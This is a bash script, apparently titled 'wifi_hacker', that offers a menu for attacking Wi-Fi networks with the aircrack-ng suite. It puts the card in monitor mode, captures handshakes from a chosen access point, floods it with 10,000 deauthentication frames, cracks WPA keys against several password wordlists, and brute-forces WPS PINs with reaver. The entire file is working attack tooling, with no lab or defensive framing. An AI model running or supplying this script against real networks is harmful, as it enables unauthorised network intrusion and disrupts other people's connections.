WLAN_INTERFACE_NAME=`ifconfig | grep wlan | awk '{print $1}'`
WLAN_INTERFACE_MONITOR_NAME=$WLAN_INTERFACE_NAME"mon"
DUMP_PACKET_NAME="wifi_hacker"
NUM_CRACK_AIREPLAY_NG="10000"

sudocmd=""

uname -r -a | grep Ubuntu
#uname -r -a | grep Debian 
if [ $? == "0" ]; then
    echo "Ubuntu system found"
    sudocmd="sudo"
    WLAN_INTERFACE_MONITOR_NAME=`ifconfig | grep mon | awk '{print $1}'`
fi

echo "Choose the option:"
echo "1. Enable monitor mode"
echo "2. Find the information of AP that you want to crack"
echo "3. Dump the packet by airodump-ng"
echo "4. Using aireplay-ng utility"
echo "5. Hacking and try to find the WPA key"
echo "6. Using reaver utility"
echo "7. Show the signal of AP"
read option
if [ $option == "1" ]; then
    $sudocmd airmon-ng start $WLAN_INTERFACE_NAME
fi
if [ $option == "2" ]; then
    $sudocmd airodump-ng $WLAN_INTERFACE_MONITOR_NAME
fi
if [ $option == "3" ]; then
    echo "Please input the mac address of AP (00:50:F1:10:00:17)"
    read mac_addr
    rm *.cap
    $sudocmd airodump-ng -w $DUMP_PACKET_NAME -o pcap -c 1 -d $mac_addr $WLAN_INTERFACE_MONITOR_NAME
fi
if [ $option == "4" ]; then
    echo "Please input the mac address of AP (00:50:F1:10:00:17)"
    read mac_addr
    $sudocmd aireplay-ng -0 $NUM_CRACK_AIREPLAY_NG -a $mac_addr --ignore-negative-one $WLAN_INTERFACE_MONITOR_NAME
fi
if [ $option == "5" ]; then
    #for Kali linux
    $sudocmd aircrack-ng -w realhuman_phill.txt,./password.lst,/usr/share/john/password.lst,/usr/share/metasploit-framework/data/john/wordlists/password.lst wifi_hacker*.cap 
    #aircrack-ng -w /usr/share/john/password.lst,/usr/share/metasploit-framework/data/john/wordlists/password.lst wifi_hacker*.cap 
fi
if [ $option == "6" ]; then
    echo "Please input the mac address of AP (00:50:F1:10:00:17)"
    read mac_addr
    #$sudocmd reaver -i $WLAN_INTERFACE_MONITOR_NAME -b $mac_addr -vvv -N -P 
    #$sudocmd reaver -i $WLAN_INTERFACE_MONITOR_NAME -b $mac_addr -vv -N -P 
    $sudocmd reaver -i $WLAN_INTERFACE_MONITOR_NAME -b $mac_addr
fi
if [ $option == "7" ]; then
    sudo airodump-ng mon0 --bssid 5C:35:3B:0C:5A:7C
fi
